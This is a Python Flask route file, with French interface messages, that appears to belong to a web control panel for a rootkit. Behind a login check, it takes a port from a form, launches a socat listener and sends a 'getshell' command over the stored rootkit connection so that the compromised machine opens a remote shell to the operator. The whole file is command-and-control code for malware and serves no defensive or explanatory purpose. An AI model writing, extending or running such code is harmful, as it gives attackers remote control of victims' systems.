from flask import Blueprint, render_template, request, redirect, url_for
import utils.state as state
from utils.socat_launcher import run_socat_shell
from utils.socket_comm import send_to_server
import time

shell_bp = Blueprint('shell', __name__)

@shell_bp.route('/', methods=['GET', 'POST'])
def shell_remote():
    if not state.authenticated:
        return redirect(url_for('auth.login'))

    shell_output = ""
    if request.method == 'POST':
        port = request.form.get('port')
        try:
            port = int(port)
            if port < 1024 or port > 65535:
                shell_output = "❌ Le port doit être entre 1024 et 65535."
            else:
                run_socat_shell(port)
                time.sleep(1)
                with state.connection_lock:
                    if state.rootkit_connection:
                        send_to_server(state.rootkit_connection, f"getshell {port}")
                        shell_output = f"🚀 Shell distant lancé sur le port {port}."
                    else:
                        shell_output = "❌ Rootkit non connecté."
        except ValueError:
            shell_output = "❌ Le port doit être un nombre valide."

    return render_template("shell_remote.html", shell_output=shell_output)
